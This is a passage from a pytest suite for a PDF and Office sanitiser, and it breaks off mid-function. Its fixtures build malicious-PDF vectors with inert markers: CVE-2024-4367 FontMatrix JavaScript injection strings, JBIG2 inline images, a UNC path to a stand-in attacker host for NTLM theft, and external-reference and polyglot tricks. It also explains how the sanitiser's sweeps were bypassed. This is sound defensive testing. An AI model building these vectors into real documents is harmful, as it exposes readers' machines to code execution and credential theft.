        content = b"q\nBI /W 4 /H 4 /CS /G /BPC 1 /F /JBIG2Decode ID INLINEXX EI\nQ\n"
        obj4 = (b"4 0 obj<</Length " + str(len(content)).encode()
                + b">>stream\n" + content + b"endstream endobj\n")
        raw = (
            b"%PDF-1.7\n"
            b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
            b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
            b"3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 100 100]/Contents 4 0 R>>endobj\n"
            + obj4 + b"trailer<</Root 1 0 R/Size 5>>\n%%EOF"
        )
        with pytest.raises(ValueError, match="inline image with decoder-RCE filter"):
            cdr.cdr_pdf(raw)

    # ── Audit fix: the same inline-image bypass also applies to an annotation's
    #    appearance stream (/AP /N) — invisible to both the page-content walk and the
    #    object-level sweep when the image lives in operator tokens ──
    def test_inline_image_jbig2_in_annotation_appearance_rejected(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        ap_stream = pdf.make_stream(
            b"q\nBI /W 4 /H 4 /CS /G /BPC 1 /F /JBIG2Decode ID INLINEXX EI\nQ\n")
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"),
            Subtype=pikepdf.Name("/Widget"),
            Rect=pikepdf.Array([0, 0, 10, 10]),
            AP=pikepdf.Dictionary(N=ap_stream),
        ))
        pdf.pages[0].Annots = pikepdf.Array([annot])
        buf = io.BytesIO()
        pdf.save(buf)

        with pytest.raises(ValueError, match="inline image with decoder-RCE filter"):
            cdr.cdr_pdf(buf.getvalue())

    def test_inline_image_benign_filter_not_rejected(self):
        # A benign inline image (no risky filter) must NOT be rejected — no false positive.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Contents = pdf.make_stream(
            b"q\nBI /W 1 /H 1 /CS /G /BPC 8 ID \x80 EI\nQ\n")
        buf = io.BytesIO()
        pdf.save(buf)
        clean, _ = cdr.cdr_pdf(buf.getvalue())  # must not raise
        assert clean

    # ── Audit fix: a risky-looking stream whose /Filter can't be trusted must FAIL
    #    CLOSED (raise), never be silently passed through (the swallow was fail-open) ─
    def test_malformed_filter_fails_closed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        s = pdf.make_stream(b"data")
        s[pikepdf.Name("/Filter")] = pikepdf.String("JBIG2Decode")  # spec-violating type
        pdf.Root["/CDRtest"] = pdf.make_indirect(s)
        buf = io.BytesIO()
        pdf.save(buf)
        with pytest.raises(ValueError):
            cdr.cdr_pdf(buf.getvalue())

    # ── ZIP polyglot: bytes appended after the archive are dropped by the rebuild ─
    def test_zip_polyglot_appended_bytes_dropped(self):
        office = _make_docx_with_macro()
        polyglot = office + b"APPENDED_TRAILING_PAYLOAD_AFTER_EOCD" * 16
        # The validator accepts it (zipfile reads from the central directory); the rebuild
        # in cdr_office re-emits only the real entries, so the appended bytes must not
        # appear in the sanitised output.
        valid, anomalies = cdr._validate_zip_structure(polyglot)
        assert valid, f"polyglot unexpectedly rejected: {anomalies}"
        clean, report = cdr.cdr_office(polyglot, "docx")
        assert b"APPENDED_TRAILING_PAYLOAD_AFTER_EOCD" not in clean, \
            "appended bytes survived the archive rebuild"
        # and the macro is still gone (sanity)
        names = zipfile.ZipFile(io.BytesIO(clean)).namelist()
        assert "word/vbaProject.bin" not in names


class TestMaliciousPdfTaxonomyGaps:
    """Regression coverage for PDF vectors drawn from the jonaslejon/malicious-pdf attack
    taxonomy (tests 29-34) that the action/annotation sweeps did NOT reach. Each was
    confirmed to survive cdr_pdf before the corresponding fix:

      * catalog /Threads      — article beads hang off the catalog, not a page or action
      * /FontMatrix           — CVE-2024-4367, JS injected via non-numeric matrix element
      * stream /F file spec   — UNC path fetched on open (NTLM theft), no action object

    No upstream code is reused; fixtures are built from the spec with reserved-invalid
    hosts so nothing can phone home. See docs/fixtures/generate_fixtures.py for the
    shareable variants."""

    UNC = "\\\\attacker.invalid\\share\\steal"

    # ── catalog /Threads article structure ──────────────────────────────────────
    def _pdf_with_threads(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        bead = pdf.make_indirect(pikepdf.Dictionary(Type=pikepdf.Name("/Bead")))
        thread = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Thread"), F=bead,
            I=pikepdf.Dictionary(Title=pikepdf.String("THREADBEADMARKER")),
        ))
        pdf.Root["/Threads"] = pikepdf.Array([thread])
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_catalog_threads_removed(self):
        raw = self._pdf_with_threads()
        assert b"THREADBEADMARKER" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"/Threads" not in clean, "catalog /Threads survived CDR"
        assert b"THREADBEADMARKER" not in clean, "thread bead info survived CDR"
        assert "/Threads" in report["removed"]
        with pikepdf.open(io.BytesIO(clean)) as p:
            assert "/Threads" not in p.Root

    def test_thread_action_on_openaction_removed(self):
        # The /Thread *action* form is already covered by the catalog /OpenAction sweep —
        # pin it so the two halves of the vector stay distinguishable in the report.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.Root["/OpenAction"] = pikepdf.Dictionary(
            S=pikepdf.Name("/Thread"),
            F=pikepdf.String("http://cdr.invalid/THREADFETCHMARKER"),
        )
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"THREADFETCHMARKER" not in clean
        assert "/OpenAction" in report["removed"]

    def test_clean_pdf_reports_no_threads_removal(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        buf = io.BytesIO()
        pdf.save(buf)
        _, report = cdr.cdr_pdf(buf.getvalue())
        assert "/Threads" not in report["removed"]

    # ── Type3 /FontMatrix JS injection (CVE-2024-4367) ──────────────────────────
    def _pdf_with_fontmatrix(self, sixth) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontBBox=pikepdf.Array([0, 0, 1, 1]),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, sixth]),
            CharProcs=pikepdf.Dictionary(a=charproc),
            FirstChar=0, LastChar=0, Widths=pikepdf.Array([0]),
        ))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_fontmatrix_js_injection_neutralised(self):
        raw = self._pdf_with_fontmatrix(
            pikepdf.String("0);globalThis.FONTMATRIXPWNED=1;//"))
        assert b"FONTMATRIXPWNED" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"FONTMATRIXPWNED" not in clean, "FontMatrix JS injection survived CDR"
        assert any("/FontMatrix" in r for r in report["removed"])
        # Output stays a valid PDF and the matrix is numeric again.
        with pikepdf.open(io.BytesIO(clean)) as p:
            font = p.pages[0].Resources["/Font"]["/F1"]
            matrix = list(font["/FontMatrix"])
            assert len(matrix) == 6
            for element in matrix:
                assert isinstance(element, (int, float, decimal.Decimal)), \
                    f"non-numeric /FontMatrix element survived: {element!r}"

    def test_numeric_fontmatrix_left_alone(self):
        # A legitimate Type3 font must not be touched — no false positive, and the
        # font's own (non-default) geometry must be preserved exactly.
        raw = self._pdf_with_fontmatrix(0.5)
        clean, report = cdr.cdr_pdf(raw)
        assert not any("/FontMatrix" in r for r in report["removed"])
        with pikepdf.open(io.BytesIO(clean)) as p:
            matrix = list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])
            assert float(matrix[5]) == 0.5, "legitimate /FontMatrix was rewritten"

    def test_wrong_length_fontmatrix_reset(self):
        # A 6-element array is required by the spec; a short one is malformed and is
        # reset rather than trusted.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=pikepdf.Array([0.001, 0, 0]),
            CharProcs=pikepdf.Dictionary(),
        ))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert any("/FontMatrix" in r for r in report["removed"])
        with pikepdf.open(io.BytesIO(clean)) as p:
            assert len(list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])) == 6

    # ── Audit findings: the /FontMatrix sweep must not be gated on /Subtype, and
    #    a PDF boolean must not pass the numeric check (bool subclasses int) ──────
    def _pdf_with_font_dict(self, extra: dict) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        font = pdf.make_indirect(pikepdf.Dictionary(
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
                                      pikepdf.String("0);SUBTYPEBYPASS=1;//")]),
            **extra,
        ))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    @pytest.mark.parametrize("extra,label", [
        ({"Type": pikepdf.Name("/Font"), "Subtype": pikepdf.Name("/Type1"),
          "BaseFont": pikepdf.Name("/Helvetica")}, "Type1 font"),
        ({"Type": pikepdf.Name("/Font"), "Subtype": pikepdf.Name("/TrueType")}, "TrueType font"),
        ({"Type": pikepdf.Name("/Font")}, "font with no /Subtype"),
        ({}, "bare dict with a /FontMatrix"),
    ])
    def test_fontmatrix_sweep_not_gated_on_subtype(self, extra, label):
        # /Subtype is attacker-controlled: gating the sweep on /Type3 lets the same
        # payload through by relabelling the font or omitting /Subtype entirely.
        raw = self._pdf_with_font_dict(extra)
        assert b"SUBTYPEBYPASS" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"SUBTYPEBYPASS" not in clean, \
            f"/FontMatrix injection survived CDR via {label}"
        assert any("/FontMatrix" in r for r in report["removed"])

    def test_fontmatrix_boolean_element_reset(self):
        # bool is a subclass of int in Python, so a naive isinstance(x, int) accepts a
        # PDF boolean — which serialises as the bare token `true`, not a number.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, True]),
            CharProcs=pikepdf.Dictionary(),
        ))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert any("/FontMatrix" in r for r in report["removed"]), \
            "boolean /FontMatrix element passed the numeric check"
        with pikepdf.open(io.BytesIO(clean)) as p:
            matrix = list(p.pages[0].Resources["/Font"]["/F1"]["/FontMatrix"])
            for element in matrix:
                assert not isinstance(element, bool), "boolean survived in /FontMatrix"

    def test_fontmatrix_injection_in_objstm_removed(self):
        # Object-stream packing must not hide the payload from the sweep.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        cp = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
                                      pikepdf.String("0);OBJSTMPWNED=1;//")]),
            CharProcs=pikepdf.Dictionary(a=cp)))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf, object_stream_mode=pikepdf.ObjectStreamMode.generate)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"OBJSTMPWNED" not in clean
        assert any("/FontMatrix" in r for r in report["removed"])

    def test_indirect_fontmatrix_array_removed(self):
        # The array itself can be an indirect object rather than inline.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        cp = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
        matrix = pdf.make_indirect(pikepdf.Array(
            [0.001, 0, 0, 0.001, 0, pikepdf.String("0);INDIRECTPWNED=1;//")]))
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=matrix, CharProcs=pikepdf.Dictionary(a=cp)))
        pdf.pages[0].Resources = pikepdf.Dictionary(Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"INDIRECTPWNED" not in clean
        assert any("/FontMatrix" in r for r in report["removed"])

    def test_indirect_threads_array_removed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.Root["/Threads"] = pdf.make_indirect(pikepdf.Array([
            pdf.make_indirect(pikepdf.Dictionary(
                Type=pikepdf.Name("/Thread"),
                I=pikepdf.Dictionary(Title=pikepdf.String("INDIRECTTHREAD"))))]))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"INDIRECTTHREAD" not in clean
        assert "/Threads" in report["removed"]

    def test_embedded_file_stream_not_falsely_swept(self):
        # The embedded-file *stream* has no /F of its own — the filename lives on the
        # parent /Filespec. Confirm the external-ref sweep doesn't misreport here.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        ef = pdf.make_stream(b"PAYLOAD")
        ef[pikepdf.Name("/Type")] = pikepdf.Name("/EmbeddedFile")
        fs = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Filespec"), F=pikepdf.String("a.txt"),
            EF=pikepdf.Dictionary(F=pdf.make_indirect(ef))))
        pdf.Root["/Names"] = pikepdf.Dictionary(EmbeddedFiles=pikepdf.Dictionary(
            Names=pikepdf.Array([pikepdf.String("a.txt"), fs])))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"PAYLOAD" not in clean  # dropped with /Names./EmbeddedFiles
        assert not any("external file ref" in r for r in report["removed"])

    # ── UNC / external file specs on stream objects ─────────────────────────────
    def _pdf_with_stream_file_ref(self, subtype: str) -> bytes:
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        stream = pdf.make_stream(b"q Q\n")
        stream[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        stream[pikepdf.Name("/Subtype")] = pikepdf.Name(subtype)
        stream[pikepdf.Name("/BBox")] = pikepdf.Array([0, 0, 10, 10])
        stream[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
        stream[pikepdf.Name("/FFilter")] = pikepdf.Name("/FlateDecode")
        pdf.pages[0].Resources = pikepdf.Dictionary(
            XObject=pikepdf.Dictionary(X0=stream))
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_unc_form_xobject_file_ref_removed(self):
        raw = self._pdf_with_stream_file_ref("/Form")
        assert b"attacker.invalid" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"attacker.invalid" not in clean, "UNC stream /F survived CDR"
        assert any("external file ref" in r for r in report["removed"])

    def test_unc_file_ref_companions_removed(self):
        # /FFilter and /FDecodeParms only have meaning alongside /F.
        clean, _ = cdr.cdr_pdf(self._pdf_with_stream_file_ref("/Form"))
        assert b"/FFilter" not in clean

    def test_unc_image_xobject_file_ref_removed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        img = pdf.make_stream(b"\x00")
        img[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        img[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
        img[pikepdf.Name("/Width")] = 1
        img[pikepdf.Name("/Height")] = 1
        img[pikepdf.Name("/BitsPerComponent")] = 8
        img[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
        img[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
        pdf.pages[0].Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary(Im0=img))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert b"attacker.invalid" not in clean, "UNC image /F survived CDR"
        assert any("external file ref" in r for r in report["removed"])

    def _image_xobject(self, pdf, **extra):
        obj = pdf.make_stream(b"\x00")
        obj[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        obj[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
        obj[pikepdf.Name("/Width")] = 1
        obj[pikepdf.Name("/Height")] = 1
        obj[pikepdf.Name("/BitsPerComponent")] = 8
        obj[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
        for key, value in extra.items():
            obj[pikepdf.Name(key)] = value
        return obj

    @pytest.mark.parametrize("subtype", ["/Type3", "/Type1", None])
    def test_direct_font_dict_fontmatrix_neutralised(self, subtype):
        # pitfall #52: pdf.objects enumerates only *indirect* objects. A font dictionary
        # written inline under /Resources /Font — never make_indirect'd — is invisible to
        # it, so a sweep built on pdf.objects is bypassed by simply not using an object
        # reference. The sweep must walk the reachable graph instead.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        font = pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
                                      pikepdf.String("0);DIRECTFONT=1;//")]))
        if subtype is not None:
            font[pikepdf.Name("/Subtype")] = pikepdf.Name(subtype)
        pdf.pages[0].Resources = pikepdf.Dictionary(
            Font=pikepdf.Dictionary(F1=font))
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        raw = buf.getvalue()
        assert b"DIRECTFONT" in raw  # precondition: payload really is in the input
        clean, report = cdr.cdr_pdf(raw)
        assert b"DIRECTFONT" not in clean, "direct (inline) font dict bypassed the sweep"
        assert any("/FontMatrix" in r for r in report["removed"])

    def test_walk_reaches_inline_nodes_on_cold_open(self):
        # Pins two walker invariants that a payload-survival test cannot catch reliably,
        # because both failure modes depend on allocator/GC timing:
        #   * direct objects must not be keyed by id() — pikepdf returns a fresh wrapper
        #     per access, so a collected wrapper's address gets reused and an unvisited
        #     node collides with a `seen` entry and is silently skipped;
        #   * the page tree must be materialised before seeding, or an inline /Resources
        #     under an untouched page is not yet reachable.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Resources = pikepdf.Dictionary(
            Font=pikepdf.Dictionary(F1=pikepdf.Dictionary(
                Type=pikepdf.Name("/Font"),
                FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0, 0]))))
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)

        # Cold open: nothing has touched pdf.pages, so the walk must materialise it itself.
        with pikepdf.open(io.BytesIO(buf.getvalue())) as cold:
            reached = [n for n in cdr._walk_pdf_nodes(cold) if "/FontMatrix" in n]
        assert reached, "walk missed an inline dict on a cold open"

    def _bulk_pdf(self, filler_nodes, payload_key):
        """A PDF whose graph exceeds a walk cap, with the payload ordered to be visited
        last. The walk pops from a stack (DFS), so a payload inserted *before* the bulk is
        popped *after* it — placing it in the truncated tail."""
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Resources = pikepdf.Dictionary()
        pdf.pages[0].Resources[payload_key] = pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
                                      pikepdf.String("0);CAPTAIL=1;//")]))
        pdf.pages[0].Resources["/ZZZ_bulk"] = pikepdf.Array(
            [pikepdf.Dictionary(I=i) for i in range(filler_nodes)])
        buf = io.BytesIO()
        pdf.save(buf, compress_streams=False)
        return buf.getvalue()

    def test_walk_cap_rejects_rather_than_truncating(self, monkeypatch):
        """Exceeding the node cap must FAIL CLOSED.

        The cap is a DoS bound, but it originally `return`ed, silently completing every
        sweep built on the generator with a partial view of the graph. Node count is
        attacker-controlled, so that handed the attacker the sweep's coverage: a 10.6 MiB
        file (well under _MAX_FILE_BYTES) with 700k filler dictionaries ordered so the
        payload popped last shipped a live CVE-2024-4367 /FontMatrix to the sanitised
        bucket with an EMPTY removed-list — no error, no warning a caller could act on.
        See pitfall #59."""
        monkeypatch.setattr(cdr, "_PDF_WALK_MAX_NODES", 50)
        raw = self._bulk_pdf(400, "/AAA_early")
        assert b"CAPTAIL" in raw  # precondition: payload really is in the input
        with pytest.raises(cdr.CdrReject, match="walk cap"):
            cdr.cdr_pdf(raw)

    def test_walk_cap_payload_in_truncated_tail_never_ships(self, monkeypatch):
        """The end-to-end claim: an over-cap file must never reach the sanitised bucket
        carrying the payload. Distinct from the test above, which pins the exception —
        this one pins the *outcome*, so replacing CdrReject with any other silent
        completion path still fails."""
        monkeypatch.setattr(cdr, "_PDF_WALK_MAX_NODES", 50)
        raw = self._bulk_pdf(400, "/AAA_early")
        try:
            clean, report = cdr.cdr_pdf(raw)
        except cdr.CdrReject:
            return  # rejected: payload cannot ship, which is the required outcome
        pytest.fail(
            "over-cap PDF was returned as sanitised rather than rejected; "
            f"payload still present={b'CAPTAIL' in clean}, report={report['removed']}")

    def test_walk_cap_does_not_fire_on_ordinary_documents(self):
        """False-positive guard: the cap must not reject real files.

        Measured headroom is ~830x — a 200-page document walks ~600 nodes against the
        500,000 cap — so rejecting on node count costs nothing in practice. Pinned because
        a future cap reduction that looks harmless would now REJECT documents rather than
        silently degrade, turning a tuning change into a production incident."""
        pdf = pikepdf.Pdf.new()
        for _ in range(200):
            pdf.add_blank_page()
        buf = io.BytesIO()
        pdf.save(buf)
        raw = buf.getvalue()
        with pikepdf.open(io.BytesIO(raw)) as opened:
            nodes = sum(1 for _ in cdr._walk_pdf_nodes(opened))
        assert nodes < cdr._PDF_WALK_MAX_NODES / 100, \
            f"200-page document walked {nodes} nodes — too close to the cap"
        clean, _ = cdr.cdr_pdf(raw)  # must not raise
        assert clean.startswith(b"%PDF-")

    def test_embedded_only_alternates_preserved(self):
        # False-positive guard: /Alternates whose images are all embedded streams is
        # legitimate fidelity data. Only subtrees that actually name an external file
        # get removed, so this one must survive untouched.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        alternate = self._image_xobject(pdf)  # fully self-contained: no /F anywhere
        base = self._image_xobject(pdf, **{"/Alternates": pikepdf.Array([
            pikepdf.Dictionary(Image=pdf.make_indirect(alternate),
                               DefaultForPrinting=True)])})
        pdf.pages[0].Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary(Im0=base))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert not any("/Alternates" in r for r in report["removed"]), \
            "embedded-only /Alternates was stripped as an external reference"
        with pikepdf.open(io.BytesIO(clean)) as out:
            xobjects = out.pages[0].obj["/Resources"]["/XObject"]
            assert "/Alternates" in xobjects["/Im0"]

    def test_image_alternates_external_ref_removed(self):
        # /Alternates holds replacement images the viewer may fetch instead of the
        # embedded one — the same fetch-on-open shape as /F, one level of indirection out.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        alternate = self._image_xobject(pdf, **{"/F": pikepdf.String(self.UNC)})
        base = self._image_xobject(pdf, **{"/Alternates": pikepdf.Array([
            pikepdf.Dictionary(Image=pdf.make_indirect(alternate),
                               DefaultForPrinting=True)])})
        pdf.pages[0].Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary(Im0=base))
        buf = io.BytesIO()
        pdf.save(buf)
        raw = buf.getvalue()
        assert b"attacker.invalid" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"attacker.invalid" not in clean, "/Alternates external ref survived CDR"
        assert any("/Alternates" in r for r in report["removed"])

    @pytest.mark.parametrize("subtype,extra", [
        ("/Image", {}),
        ("/Form", {"/BBox": [0, 0, 9, 9]}),
    ])
    def test_opi_external_ref_removed(self, subtype, extra):
        # /OPI (Open Prepress Interface) names a high-resolution replacement to fetch at
        # print time — a UNC target here is the same NTLM leak as /F.
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        obj = pdf.make_stream(b"q Q\n")
        obj[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        obj[pikepdf.Name("/Subtype")] = pikepdf.Name(subtype)
        for key, value in extra.items():
            obj[pikepdf.Name(key)] = pikepdf.Array(value)
        obj[pikepdf.Name("/OPI")] = pikepdf.Dictionary(**{
            "/2.0": pikepdf.Dictionary(Type=pikepdf.Name("/OPI"),
                                       F=pikepdf.String(self.UNC))})
        pdf.pages[0].Resources = pikepdf.Dictionary(XObject=pikepdf.Dictionary(X0=obj))
        buf = io.BytesIO()
        pdf.save(buf)
        raw = buf.getvalue()
        assert b"attacker.invalid" in raw  # precondition
        clean, report = cdr.cdr_pdf(raw)
        assert b"attacker.invalid" not in clean, f"/OPI ref survived CDR on {subtype}"
        assert any("/OPI" in r for r in report["removed"])

    def test_clean_pdf_reports_no_external_ref_removal(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        buf = io.BytesIO()
        pdf.save(buf)
        _, report = cdr.cdr_pdf(buf.getvalue())
        assert not any("external file ref" in r for r in report["removed"])

    # ── all three combined, plus a /GoToR annotation action ─────────────────────
    def test_combined_taxonomy_pdf_fully_disarmed(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.Root["/Threads"] = pikepdf.Array([pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Thread"),
            I=pikepdf.Dictionary(Title=pikepdf.String("MULTITHREADMARKER")),
        ))])
        charproc = pdf.make_stream(b"0 0 0 0 0 0 d0\n")
        font = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Font"), Subtype=pikepdf.Name("/Type3"),
            FontMatrix=pikepdf.Array([0.001, 0, 0, 0.001, 0,
                                      pikepdf.String("0);MULTIFONTPWNED=1;//")]),
            CharProcs=pikepdf.Dictionary(a=charproc),
        ))
        img = pdf.make_stream(b"\x00")
        img[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        img[pikepdf.Name("/Subtype")] = pikepdf.Name("/Image")
        img[pikepdf.Name("/Width")] = 1
        img[pikepdf.Name("/Height")] = 1
        img[pikepdf.Name("/BitsPerComponent")] = 8
        img[pikepdf.Name("/ColorSpace")] = pikepdf.Name("/DeviceGray")
        img[pikepdf.Name("/F")] = pikepdf.String(self.UNC)
        pdf.pages[0].Resources = pikepdf.Dictionary(
            Font=pikepdf.Dictionary(F1=font), XObject=pikepdf.Dictionary(Im0=img))
        annot = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Link"),
            Rect=pikepdf.Array([0, 0, 10, 10]),
            A=pikepdf.Dictionary(S=pikepdf.Name("/GoToR"),
                                 F=pikepdf.String("GOTORMARKER")),
        ))
        pdf.pages[0].obj["/Annots"] = pikepdf.Array([annot])
        buf = io.BytesIO()
        pdf.save(buf)

        clean, report = cdr.cdr_pdf(buf.getvalue())
        for marker in (b"MULTITHREADMARKER", b"MULTIFONTPWNED",
                       b"attacker.invalid", b"GOTORMARKER"):
            assert marker not in clean, f"{marker.decode()} survived CDR"
        assert "/Threads" in report["removed"]
        assert any("/FontMatrix" in r for r in report["removed"])
        assert any("external file ref" in r for r in report["removed"])
        assert any("annot/A" in r for r in report["removed"])
        with pikepdf.open(io.BytesIO(clean)) as p:
            assert len(p.pages) == 1


class TestInlineRiskyImageContainers:
    """An inline image declaring a decoder-RCE filter (/JBIG2Decode, /JPXDecode) has no
    stream object to rewrite, so cdr_pdf must REJECT the file. The sweep originally
    walked only page content streams, one level of /XObject gated on /Subtype == /Form,
    and /AP appearance streams — every other content-stream container was a live bypass.
    Compounding it, a blanket `except Exception: continue` around the operand loop
    swallowed the sweep's own rejection (pitfall #51c), so even reachable payloads
    passed. All six containers below were confirmed to survive before the fix.
    """

    INLINE = b"BI /W 16 /H 16 /BPC 1 /CS /G /F /JBIG2Decode ID \x00\x00\x00\x00 EI\n"

    @staticmethod
    def _form(pdf, content, subtype="/Form", **extra):
        stream = pdf.make_stream(content)
        stream[pikepdf.Name("/Type")] = pikepdf.Name("/XObject")
        if subtype is not None:
            stream[pikepdf.Name("/Subtype")] = pikepdf.Name(subtype)
        stream[pikepdf.Name("/BBox")] = pikepdf.Array([0, 0, 16, 16])
        for key, value in extra.items():
            stream[pikepdf.Name("/" + key.lstrip("/"))] = value
        return stream

    @staticmethod
    def _serialise(pdf):
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def _resourced(self, resources):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Resources = resources(pdf)
        return self._serialise(pdf)

    def _assert_rejected(self, raw, label):
        with pytest.raises(Exception) as excinfo:
            cdr.cdr_pdf(raw)
        assert "risky" in str(excinfo.value).lower() or "inline" in str(excinfo.value).lower(), \
            f"{label}: rejected, but not by the inline risky-image sweep: {excinfo.value}"

    def test_page_content_stream_rejected(self):
        pdf = pikepdf.Pdf.new()
        pdf.add_blank_page()
        pdf.pages[0].Contents = pdf.make_stream(self.INLINE)
        self._assert_rejected(self._serialise(pdf), "page content stream")

    def test_form_xobject_one_level_rejected(self):
        raw = self._resourced(lambda pdf: pikepdf.Dictionary(
            XObject=pikepdf.Dictionary(F0=pdf.make_indirect(self._form(pdf, self.INLINE)))))
        self._assert_rejected(raw, "form XObject one level from the page")

    def test_nested_form_xobject_rejected(self):
        # The old sweep descended exactly one /XObject level from the page.
        def resources(pdf):
